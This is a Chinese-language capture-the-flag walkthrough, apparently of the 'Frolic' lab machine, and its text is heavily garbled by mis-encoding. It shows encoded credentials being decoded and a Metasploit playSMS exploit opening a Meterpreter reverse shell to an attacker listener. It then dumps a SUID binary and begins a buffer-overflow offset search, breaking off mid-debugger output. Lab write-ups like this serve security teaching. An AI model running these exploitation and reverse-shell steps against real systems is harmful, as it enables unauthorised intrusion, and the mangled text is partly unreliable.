ï¿½ï¿½Ssï¿½Jwâ–’Üï¿½ï¿½4ï¿½ï¿½kï¿½zï¿½ï¿½UÈ–ï¿½+Xï¿½ï¿½Pï¿½ï¿½á¶‡ï¿½ï¿½Ğ»ï¿½x_ï¿½Nï¿½[ï¿½ï¿½ï¿½Sï¿½ï¿½8ï¿½ï¿½ï¿½ï¿½ï¿½J2Sï¿½*ï¿½DĞ}ï¿½8dTQkï¿½ï¿½ï¿½ï¿½ï¿½ï¿½j_ï¿½ï¿½ï¿½â–’ï¿½ï¿½ï¿½&#39;xcï¿½ï¿½İtï¿½ï¿½75Qï¿½ ï¿½ï¿½ï¿½k,4ï¿½ï¿½b)ï¿½4Fï¿½ï¿½ ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½&amp;q2oï¿½WÔœï¿½9P#ï¿½[ï¿½iPK Ã‰7M#ï¿½[ï¿½i â–’ï¿½ï¿½index.phpUTï¿½|ï¿½[ux PKO è§£å¯†åå¾—åˆ°äº†ä¸€äº›ä¹±ç è¾“å‡ºï¼Œæœ‰ç‚¹å¥‡æ€ªï¼Œå°è¯•ç»™ä»–å†™å‡ºåˆ°æ–‡ä»¶ï¼Œç„¶åæŸ¥çœ‹ä¸‹ç±»å‹å‘¢ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# curl http://10.10.10.111:9999/asdiSIAJJ0QWE9JAS/|base64 -d &gt; file % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 487 0 487 0 0 748 0 --:--:-- --:--:-- --:--:-- 749 â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# file file file: Zip archive data, at least v2.0 to extract è¿™æ˜¯ä¸€ä¸ª zip çš„å‹ç¼©æ–‡ä»¶ï¼Œå»æ›´æ”¹ä¸‹åç¼€ç„¶åå°è¯•è§£å‹ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# mv file file.zip â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# unzip file.zip Archive: file.zip [file.zip] index.php password: skipping: index.php incorrect password æœ‰è§£å‹å¯†ç ï¼Œéšæ‰‹å°è¯•å‡ ä¸ªå¼±å£ä»¤è¯•è¯• â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# unzip file.zip Archive: file.zip [file.zip] index.php password: inflating: index.php è§£å‹å¯†ç æ˜¯ passwordï¼ŒæˆåŠŸè§£å‹å‡ºæ¥ä¸€ä¸ª index.php æ–‡ä»¶ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# cat index.php 4b7973724b7973674b7973724b7973675779302b4b7973674b7973724b7973674b79737250463067506973724b7973674b7934744c5330674c5330754b7973674b7973724b7973674c6a77720d0a4b7973675779302b4b7973674b7a78645069734b4b797375504373674b7974624c5434674c53307450463067506930744c5330674c5330754c5330674c5330744c5330674c6a77724b7973670d0a4b317374506973674b79737250463067506973724b793467504373724b3173674c5434744c53304b5046302b4c5330674c6a77724b7973675779302b4b7973674b7a7864506973674c6930740d0a4c533467504373724b3173674c5434744c5330675046302b4c5330674c5330744c533467504373724b7973675779302b4b7973674b7973385854344b4b7973754c6a776743673d3d0d0a è¿™åˆæ˜¯ç¼–ç ã€‚ã€‚ã€‚ è¿™åº”è¯¥æ˜¯åå…­è¿›åˆ¶ç¼–ç ï¼Œæˆ‘ä»¬å»è§£å¯†ä¸€ä¸‹ https://gchq.github.io/CyberChef/ å‡ºæ¥åæ˜¯ base64 ç¼–ç ï¼Œå’±ä»¬å†è§£å¯†ä¸€é‡ +++++ +++++ [-&gt;++ +++++ +++&lt;] &gt;++++ +.--- --.++ +++++ .&lt;+++ [-&gt;++ +&lt;]&gt;+ ++.&lt;+ ++[-&gt; ---&lt;] &gt;---- --.-- ----- .&lt;+++ +[-&gt;+ +++&lt;] &gt;+++. &lt;+++[ -&gt;--- &lt;]&gt;-- .&lt;+++ [-&gt;++ +&lt;]&gt;+ .---. &lt;+++[ -&gt;--- &lt;]&gt;-- ----. &lt;++++ [-&gt;++ ++&lt;]&gt; ++..&lt; è¿™æ˜¯æ¬¡ brainfuckï¼Œå’±ä»¬å»è§£å¯†ä¸€ä¸‹ https://sange.fi/esoteric/brainfuck/impl/interp/i.html username = admin password = idkwhatispass åœ¨ &#x2F;dev&#x2F;backup ä¸­æç¤ºæœ‰ä¸€ä¸ª &#x2F;playsms ç›®å½• å’±ä»¬åœ¨è¿™é‡Œç™»å½• ç™»å½•æˆåŠŸï¼Œåˆ°å¤„æ‰¾æ‰¾çœ‹ Google äº†ä¸€ä¸‹ï¼ŒplaySMS çš„æ¼æ´æŒºå¤šçš„ï¼Œè§£å¯†ç´¯äº†ï¼Œæ‡’å¾—æ‰¾äº†ï¼Œç›´æ¥ msf æ‰“è¯•è¯•å§ use multi/http/playsms_uploadcsv_exec msf6 exploit(multi/http/playsms_uploadcsv_exec) &gt; show options Module options (exploit/multi/http/playsms_uploadcsv_exec): Name Current Setting Required Description ---- --------------- -------- ----------- PASSWORD idkwhatispass yes Password to authenticate with Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS 10.10.10.111 yes The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39; RPORT 9999 yes The target port (TCP) SSL false no Negotiate SSL/TLS for outgoing connections TARGETURI /playsms yes Base playsms directory path USERNAME admin yes Username to authenticate with VHOST no HTTP server virtual host Payload options (php/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST 10.10.14.10 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 PlaySMS 1.4 æŒ‰ç…§è¿™æ ·è®¾ç½®å¥½ï¼Œç„¶å exploit æ‰§è¡Œå³å¯ msf6 exploit(multi/http/playsms_uploadcsv_exec) &gt; exploit [*] Started reverse TCP handler on 10.10.14.10:4444 [+] Authentication successful: admin:idkwhatispass [*] Sending stage (39282 bytes) to 10.10.10.111 [*] Meterpreter session 2 opened (10.10.14.10:4444 -&gt; 10.10.10.111:52368) at 2022-04-25 23:13:40 -0400 meterpreter &gt; getuid Server username: www-data (33) æˆåŠŸæ‹¿åˆ°ä¸€ä¸ª user æƒé™ www-data@frolic:/home/ayush$ cat user.txt cat user.txt 2ab95909cf509f85a6f476b59a0c2fe0 æˆåŠŸæ‹¿åˆ°ä¸€ä¸ª user æƒé™çš„ flag æ–‡ä»¶ æƒé™æå‡www-data@frolic:/home/ayush/.binary$ ls -la ls -la total 16 drwxrwxr-x 2 ayush ayush 4096 Sep 25 2018 . drwxr-xr-x 3 ayush ayush 4096 Sep 25 2018 .. -rwsr-xr-x 1 root root 7480 Sep 25 2018 rop www-data@frolic:/home/ayush/.binary$ pwd pwd /home/ayush/.binary åœ¨ &#x2F;home&#x2F;ayush&#x2F;.binary ä¸‹å‘ç°äº†ä¸€ä¸ª rop æ–‡ä»¶ï¼Œå¹¶ä¸”æˆ‘ä»¬æ‹¥æœ‰å¯æ‰§è¡Œæƒé™ www-data@frolic:/home/ayush/.binary$ ./rop ./rop [*] Usage: program &lt;message&gt; ä¼šè·å–æˆ‘ä»¬çš„è¾“å…¥å†…å®¹ï¼Œç„¶åè¾“å‡º www-data@frolic:/home/ayush/.binary$ base64 rop base64 rop f0VMRgEBAQAAAAAAAAAAAAIAAwABAAAAoIMECDQAAABgGAAAAAAAADQAIAAJACgAHwAcAAYAAAA0 AAAANIAECDSABAggAQAAIAEAAAUAAAAEAAAAAwAAAFQBAABUgQQIVIEECBMAAAATAAAABAAAAAEA AAABAAAAAAAAAACABAgAgAQIGAcAABgHAAAFAAAAABAAAAEAAAAIDwAACJ8ECAifBAggAQAAJAEA AAYAAAAAEAAAAgAAABQPAAAUnwQIFJ8ECOgAAADoAAAABgAAAAQAAAAEAAAAaAEAAGiBBAhogQQI RAAAAEQAAAAEAAAABAAAAFDldGTwBQAA8IUECPCFBAg0AAAANAAAAAQAAAAEAAAAUeV0ZAAAAAAA AAAAAAAAAAAAAAAAAAAABgAAABAAAABS5XRkCA8AAAifBAgInwQI+AAAAPgAAAAEAAAAAQAAAC9s aWIvbGQtbGludXguc28uMgAABAAAABAAAAABAAAAR05VAAAAAAACAAAABgAAACAAAAAEAAAAFAAA AAMAAABHTlUAWdqRwQDROMZit3Yntl77vJ95c5QCAAAABwAAAAEAAAAFAAAAACAAIAAAAAAHAAAA rUvjwAAAAAAAAAAAAAAAAAAAAAAtAAAAAAAAAAAAAAASAAAAIQAAAAAAAAAAAAAAEgAAACgAAAAA AAAAAAAAABIAAABGAAAAAAAAAAAAAAAgAAAANAAAAAAAAAAAAAAAEgAAABoAAAAAAAAAAAAAABIA AAALAAAAvIUECAQAAAARABAAAGxpYmMuc28uNgBfSU9fc3RkaW5fdXNlZABzZXR1aWQAc3RyY3B5 AHB1dHMAcHJpbnRmAF9fbGliY19zdGFydF9tYWluAF9fZ21vbl9zdGFydF9fAEdMSUJDXzIuMAAA AAACAAIAAgAAAAIAAgABAAEAAQABAAAAEAAAAAAAAAAQaWkNAAACAFUAAAAAAAAA/J8ECAYEAAAM oAQIBwEAABCgBAgHAgAAFKAECAcDAAAYoAQIBwUAABygBAgHBgAAU4PsCOi7AAAAgcPrHAAAi4P8 ////hcB0BehmAAAAg8QIW8MA/zUEoAQI/yUIoAQIAAAAAP8lDKAECGgAAAAA6eD/////JRCgBAho CAAAAOnQ/////yUUoAQIaBAAAADpwP////8lGKAECGgYAAAA6bD/////JRygBAhoIAAAAOmg//// /yX8nwQIZpAAAAAAAAAAADHtXonhg+TwUFRSaKCFBAhoQIUECFFWaJuEBAjor/////RmkGaQZpBm kGaQZpBmkIscJMNmkGaQZpBmkGaQZpC4K6AECC0ooAQIg/gGdhq4AAAAAIXAdBFVieWD7BRoKKAE CP/Qg8QQyfPDkI10JgC4KKAECC0ooAQIwfgCicLB6h8B0NH4dBu6AAAAAIXSdBJVieWD7BBQaCig BAj/0oPEEMnzw410JgCNvCcAAAAAgD0ooAQIAHUTVYnlg+wI6Hz////GBSigBAgByfPDZpC4EJ8E CIsQhdJ1BeuTjXYAugAAAACF0nTyVYnlg+wUUP/Sg8QQyel1////jUwkBIPk8P9x/FWJ5VNRicuD 7AxqAOjK/v//g8QQgzsBfxeD7AxowIUECOiV/v//g8QQuP/////rGYtDBIPABIsAg+wMUOgSAAAA g8QQuAAAAACNZfhZW12NYfzDVYnlg+w4g+wI/3UIjUXQUOhD/v//g8QQg+wMaN2FBAjoI/7//4PE EIPsDI1F0FDoFP7//4PEEJDJw2aQZpBmkGaQZpBmkGaQVVdWU+iH/v//gcO3GgAAg+wMi2wkII2z DP///+ir/f//jYMI////KcbB/gKF9nQlMf+NtgAAAACD7AT/dCQs/3QkLFX/lLsI////g8cBg8QQ Ofd144PEDFteX13DjXYA88MAAFOD7AjoI/7//4HDUxoAAIPECFvDAwAAAAEAAgBbKl0gVXNhZ2U6 IHByb2dyYW0gPG1lc3NhZ2U+AFsrXSBNZXNzYWdlIHNlbnQ6IAABGwM7MAAAAAUAAABA/f//TAAA AKv+//9wAAAACP///6QAAABQ////xAAAALD///8QAQAAFAAAAAAAAAABelIAAXwIARsMBASIAQAA IAAAABwAAADs/P//YAAAAAAOCEYODEoPC3QEeAA/GjsqMiQiMAAAAEAAAAAz/v//XQAAAABEDAEA RxAFAnUARA8DdXgGEAMCdXwCSMEMAQBBw0HFQwwEBBwAAAB0AAAAXP7//zoAAAAAQQ4IhQJCDQV2 xQwEBAAASAAAAJQAAACE/v//XQAAAABBDgiFAkEODIcDQQ4QhgRBDhSDBU4OIGkOJEQOKEQOLEEO ME0OIEcOFEHDDhBBxg4MQccOCEHFDgQAABAAAADgAAAAmP7//wIAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABwhAQIUIQECAAAAAABAAAAAQAAAAwAAAAMgwQI DQAAAKSFBAgZAAAACJ8ECBsAAAAEAAAAGgAAAAyfBAgcAAAABAAAAPX+/2+sgQQIBQAAAEyCBAgG AAAAzIEECAoAAABfAAAACwAAABAAAAAVAAAAAAAAAAMAAAAAoAQIAgAAACgAAAAUAAAAEQAAABcA AADkggQIEQAAANyCBAgSAAAACAAAABMAAAAIAAAA/v//b7yCBAj///9vAQAAAPD//2+sggQIAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABSfBAgAAAAA AAAAAEaDBAhWgwQIZoMECHaDBAiGgwQIAAAAAAAAAABHQ0M6IChVYnVudHUgNS40LjAtNnVidW50 dTF+MTYuMDQuMTApIDUuNC4wIDIwMTYwNjA5AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAVIEECAAA AAADAAEAAAAAAGiBBAgAAAAAAwACAAAAAACIgQQIAAAAAAMAAwAAAAAArIEECAAAAAADAAQAAAAA AMyBBAgAAAAAAwAFAAAAAABMggQIAAAAAAMABgAAAAAArIIECAAAAAADAAcAAAAAALyCBAgAAAAA AwAIAAAAAADcggQIAAAAAAMACQAAAAAA5IIECAAAAAADAAoAAAAAAAyDBAgAAAAAAwALAAAAAAAw gwQIAAAAAAMADAAAAAAAkIMECAAAAAADAA0AAAAAAKCDBAgAAAAAAwAOAAAAAACkhQQIAAAAAAMA DwAAAAAAuIUECAAAAAADABAAAAAAAPCFBAgAAAAAAwARAAAAAAAkhgQIAAAAAAMAEgAAAAAACJ8E CAAAAAADABMAAAAAAAyfBAgAAAAAAwAUAAAAAAAQnwQIAAAAAAMAFQAAAAAAFJ8ECAAAAAADABYA AAAAAPyfBAgAAAAAAwAXAAAAAAAAoAQIAAAAAAMAGAAAAAAAIKAECAAAAAADABkAAAAAACigBAgA AAAAAwAaAAAAAAAAAAAAAAAAAAMAGwABAAAAAAAAAAAAAAAEAPH/DAAAABCfBAgAAAAAAQAVABkA AADggwQIAAAAAAIADgAbAAAAEIQECAAAAAACAA4ALgAAAFCEBAgAAAAAAgAOAEQAAAAooAQIAQAA AAEAGgBTAAAADJ8ECAAAAAABABQAegAAAHCEBAgAAAAAAgAOAIYAAAAInwQIAAAAAAEAEwClAAAA AAAAAAAAAAAEAPH/AQAAAAAAAAAAAAAABADx/6sAAAAUhwQIAAAAAAEAEgC5AAAAEJ8ECAAAAAAB ABUAAAAAAAAAAAAAAAAABADx/8UAAAAMnwQIAAAAAAAAEwDWAAAAFJ8ECAAAAAABABYA3wAAAAif BAgAAAAAAAATAPIAAADwhQQIAAAAAAAAEQAFAQAAAKAECAAAAAABABgAGwEAAKCFBAgCAAAAEgAO ACsBAAAAAAAAAAAAACAAAABHAQAA0IMECAQAAAASAg4AjwEAACCgBAgAAAAAIAAZAF0BAAAAAAAA AAAAABIAAABvAQAA+IQECDoAAAASAA4AdAEAACigBAgAAAAAEAAZACUBAACkhQQIAAAAABIADwB7 AQAAAAAAAAAAAAASAAAAjQEAACCgBAgAAAAAEAAZAJoBAAAAAAAAAAAAABIAAACqAQAAAAAAAAAA AAAgAAAAuQEAACSgBAgAAAAAEQIZAMYBAAC8hQQIBAAAABEAEADVAQAAAAAAAAAAAAASAAAA8gEA AECFBAhdAAAAEgAOANEAAAAsoAQIAAAAABAAGgCTAQAAoIMECAAAAAASAA4AAgIAALiFBAgEAAAA EQAQAAkCAAAooAQIAAAAABAAGgAVAgAAm4QECF0AAAASAA4AGgIAAAAAAAAAAAAAEgAAACwCAAAA AAAAAAAAACAAAABAAgAAKKAECAAAAAARAhkATAIAAAAAAAAAAAAAIAAAAPwBAAAMgwQIAAAAABIA CwAAY3J0c3R1ZmYuYwBfX0pDUl9MSVNUX18AZGVyZWdpc3Rlcl90bV9jbG9uZXMAX19kb19nbG9i YWxfZHRvcnNfYXV4AGNvbXBsZXRlZC43MjA5AF9fZG9fZ2xvYmFsX2R0b3JzX2F1eF9maW5pX2Fy cmF5X2VudHJ5AGZyYW1lX2R1bW15AF9fZnJhbWVfZHVtbXlfaW5pdF9hcnJheV9lbnRyeQByb3Au YwBfX0ZSQU1FX0VORF9fAF9fSkNSX0VORF9fAF9faW5pdF9hcnJheV9lbmQAX0RZTkFNSUMAX19p bml0X2FycmF5X3N0YXJ0AF9fR05VX0VIX0ZSQU1FX0hEUgBfR0xPQkFMX09GRlNFVF9UQUJMRV8A X19saWJjX2NzdV9maW5pAF9JVE1fZGVyZWdpc3RlclRNQ2xvbmVUYWJsZQBfX3g4Ni5nZXRfcGNf dGh1bmsuYngAcHJpbnRmQEBHTElCQ18yLjAAdnVsbgBfZWRhdGEAc3RyY3B5QEBHTElCQ18yLjAA X19kYXRhX3N0YXJ0AHB1dHNAQEdMSUJDXzIuMABfX2dtb25fc3RhcnRfXwBfX2Rzb19oYW5kbGUA X0lPX3N0ZGluX3VzZWQAX19saWJjX3N0YXJ0X21haW5AQEdMSUJDXzIuMABfX2xpYmNfY3N1X2lu aXQAX2ZwX2h3AF9fYnNzX3N0YXJ0AG1haW4Ac2V0dWlkQEBHTElCQ18yLjAAX0p2X1JlZ2lzdGVy Q2xhc3NlcwBfX1RNQ19FTkRfXwBfSVRNX3JlZ2lzdGVyVE1DbG9uZVRhYmxlAAAuc3ltdGFiAC5z dHJ0YWIALnNoc3RydGFiAC5pbnRlcnAALm5vdGUuQUJJLXRhZwAubm90ZS5nbnUuYnVpbGQtaWQA LmdudS5oYXNoAC5keW5zeW0ALmR5bnN0cgAuZ251LnZlcnNpb24ALmdudS52ZXJzaW9uX3IALnJl bC5keW4ALnJlbC5wbHQALmluaXQALnBsdC5nb3QALnRleHQALmZpbmkALnJvZGF0YQAuZWhfZnJh bWVfaGRyAC5laF9mcmFtZQAuaW5pdF9hcnJheQAuZmluaV9hcnJheQAuamNyAC5keW5hbWljAC5n b3QucGx0AC5kYXRhAC5ic3MALmNvbW1lbnQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAABsAAAABAAAAAgAAAFSBBAhUAQAAEwAAAAAAAAAAAAAAAQAAAAAAAAAjAAAABwAA AAIAAABogQQIaAEAACAAAAAAAAAAAAAAAAQAAAAAAAAAMQAAAAcAAAACAAAAiIEECIgBAAAkAAAA AAAAAAAAAAAEAAAAAAAAAEQAAAD2//9vAgAAAKyBBAisAQAAIAAAAAUAAAAAAAAABAAAAAQAAABO AAAACwAAAAIAAADMgQQIzAEAAIAAAAAGAAAAAQAAAAQAAAAQAAAAVgAAAAMAAAACAAAATIIECEwC AABfAAAAAAAAAAAAAAABAAAAAAAAAF4AAAD///9vAgAAAKyCBAisAgAAEAAAAAUAAAAAAAAAAgAA AAIAAABrAAAA/v//bwIAAAC8ggQIvAIAACAAAAAGAAAAAQAAAAQAAAAAAAAAegAAAAkAAAACAAAA 3IIECNwCAAAIAAAABQAAAAAAAAAEAAAACAAAAIMAAAAJAAAAQgAAAOSCBAjkAgAAKAAAAAUAAAAY AAAABAAAAAgAAACMAAAAAQAAAAYAAAAMgwQIDAMAACMAAAAAAAAAAAAAAAQAAAAAAAAAhwAAAAEA AAAGAAAAMIMECDADAABgAAAAAAAAAAAAAAAQAAAABAAAAJIAAAABAAAABgAAAJCDBAiQAwAACAAA AAAAAAAAAAAACAAAAAAAAACbAAAAAQAAAAYAAACggwQIoAMAAAICAAAAAAAAAAAAABAAAAAAAAAA oQAAAAEAAAAGAAAApIUECKQFAAAUAAAAAAAAAAAAAAAEAAAAAAAAAKcAAAABAAAAAgAAALiFBAi4 BQAAOAAAAAAAAAAAAAAABAAAAAAAAACvAAAAAQAAAAIAAADwhQQI8AUAADQAAAAAAAAAAAAAAAQA AAAAAAAAvQAAAAEAAAACAAAAJIYECCQGAAD0AAAAAAAAAAAAAAAEAAAAAAAAAMcAAAAOAAAAAwAA AAifBAgIDwAABAAAAAAAAAAAAAAABAAAAAAAAADTAAAADwAAAAMAAAAMnwQIDA8AAAQAAAAAAAAA AAAAAAQAAAAAAAAA3wAAAAEAAAADAAAAEJ8ECBAPAAAEAAAAAAAAAAAAAAAEAAAAAAAAAOQAAAAG AAAAAwAAABSfBAgUDwAA6AAAAAYAAAAAAAAABAAAAAgAAACWAAAAAQAAAAMAAAD8nwQI/A8AAAQA AAAAAAAAAAAAAAQAAAAEAAAA7QAAAAEAAAADAAAAAKAECAAQAAAgAAAAAAAAAAAAAAAEAAAABAAA APYAAAABAAAAAwAAACCgBAggEAAACAAAAAAAAAAAAAAABAAAAAAAAAD8AAAACAAAAAMAAAAooAQI KBAAAAQAAAAAAAAAAAAAAAEAAAAAAAAAAQEAAAEAAAAwAAAAAAAAACgQAAA1AAAAAAAAAAAAAAAB AAAAAQAAABEAAAADAAAAAAAAAAAAAABWFwAACgEAAAAAAAAAAAAAAQAAAAAAAAABAAAAAgAAAAAA AAAAAAAAYBAAAJAEAAAeAAAALwAAAAQAAAAQAAAACQAAAAMAAAAAAAAAAAAAAPAUAABmAgAAAAAA AAAAAAABAAAAAAAAAA== ç¼–ç è¿™ä¸ªæ–‡ä»¶ï¼Œç„¶åå¸¦æˆ‘ä»¬è‡ªå·±çš„æœºå™¨ä¸Šè§£ç æŸ¥çœ‹è°ƒè¯• â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# cat rop.base64|base64 -d &gt; rop â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# chmod +x rop â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# ./rop hello [+] Message sent: hello â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 100 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A ä½¿ç”¨ metasploit çš„ pattern ç”Ÿæˆä¸€ä¸ª 100 å­—ç¬¦çš„ä¸é‡å¤å­—æ®µ gdb-peda$ r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A Starting program: /root/Desktop/rop Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A Program received signal SIGSEGV, Segmentation fault. [----------------------------------registers-----------------------------------] EAX: 0x64 (&#39;d&#39;) EBX: 0xffffd0f0 --&gt; 0x2 ECX: 0xf7fa7000 --&gt; 0x1ead6c EDX: 0x0 ESI: 0x2 EDI: 0x80483a0 (&lt;_start&gt;: xor ebp,ebp) EBP: 0x41366241 (&#39;Ab6A&#39;) ESP: 0xffffd0c0 (&quot;8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A&quot;) EIP: 0x62413762 (&#39;b7Ab&#39;) EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow) [-------------------------------------code-------------------------------------] Invalid $PC address: 0x62413762 [------------------------------------stack-------------------------------------] 0000| 0xffffd0c0 (&quot;8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A&quot;) 0004| 0xffffd0c4 (&quot;Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A&quot;) 0008| 0xffffd0c8 (&quot;c1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A&quot;) 0012| 0xffffd0cc (&quot;2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A&quot;) 0016| 0xffffd0d0 (&quot;Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A&quot;) 0020| 0xffffd0d4 (&quot;c5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A&quot;) 0024| 0xffffd0d8 (&quot;6Ac7Ac8Ac9Ad0Ad1Ad2A&quot;) 0028| 0xffffd0dc (&quot;Ac8Ac9Ad0Ad1Ad2A&quot;) [------------------------------------------------------------------------------] Legend: code, data, 